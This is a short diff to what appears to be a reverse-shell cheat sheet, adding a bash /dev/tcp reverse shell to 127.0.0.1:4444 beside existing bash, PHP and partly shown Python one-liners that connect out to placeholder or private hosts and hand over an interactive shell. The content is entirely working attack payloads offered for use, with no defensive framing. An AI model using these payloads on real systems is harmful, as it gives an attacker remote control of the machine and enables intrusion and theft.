@@ -26,6 +26,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 # bash (linux)
 bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 
 # php
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
